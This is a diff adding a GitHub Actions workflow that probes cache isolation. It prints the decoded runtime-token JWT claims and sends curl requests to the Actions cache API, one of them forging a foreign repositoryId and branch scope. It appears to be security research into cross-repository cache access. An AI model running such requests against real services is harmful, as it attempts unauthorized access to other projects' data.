@@ -1,0 +1,69 @@
+name: Cache Scope Boundary Test
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  actions: read
+jobs:
+  cache-scope:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Pre-cache env
+        run: |
+          echo "=== Pre-cache ACTIONS env ==="
+          env | grep "^ACTIONS_" | sed 's/=.*TOKEN.*/=***REDACTED***/' | sort
+      - uses: actions/cache@v4
+        with:
+          path: /tmp/cache-probe
+          key: scope-probe-${{ github.run_id }}
+      - name: Post-cache scope test
+        run: |
+          echo "=== Post-cache ACTIONS env ==="
+          env | grep "^ACTIONS_" | sed 's/=.*TOKEN.*/=***REDACTED***/' | sort
+          
+          echo ""
+          echo "=== ACTIONS_RESULTS_URL ==="
+          echo "${ACTIONS_RESULTS_URL:-EMPTY}"
+          
+          echo ""
+          echo "=== ACTIONS_CACHE_URL ==="
+          echo "${ACTIONS_CACHE_URL:-EMPTY}"
+          
+          echo ""
+          echo "=== Runtime token JWT claims (header+payload only) ==="
+          if [ -n "$ACTIONS_RUNTIME_TOKEN" ]; then
+            echo "$ACTIONS_RUNTIME_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "Failed to decode"
+          fi
+          
+          echo ""
+          echo "=== Test: Cache API with modified repositoryId ==="
+          if [ -n "$ACTIONS_RESULTS_URL" ]; then
+            # Try to create a cache entry with a foreign repositoryId via twirp
+            # First, let's probe what the cache service accepts
+            TWIRP_URL="${ACTIONS_RESULTS_URL}twirp/results.api.v1.CacheService/GetCacheEntryDownloadURL"
+            echo "Twirp URL: $TWIRP_URL"
+            
+            # Normal request (should work)
+            echo "Normal cache lookup:"
+            curl -s -w "\nHTTP:%{http_code}" \
+              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              -H "Content-Type: application/json" \
+              -X POST "$TWIRP_URL" \
+              -d '{"key":"scope-probe-test","version":"v1"}' | tail -c 300
+            
+            echo ""
+            echo "With foreign repositoryId:"
+            curl -s -w "\nHTTP:%{http_code}" \
+              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              -H "Content-Type: application/json" \
+              -X POST "$TWIRP_URL" \
+              -d '{"key":"test-key","version":"v1","metadata":{"repositoryId":1187665821,"scope":[{"scope":"refs/heads/main","permission":2}]}}' | tail -c 300
+          fi
+          
+          if [ -n "$ACTIONS_CACHE_URL" ]; then
+            echo ""
+            echo "=== v1 Cache API test ==="
+            curl -s -w "\nHTTP:%{http_code}" \
+              -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" | tail -c 300
+          fi
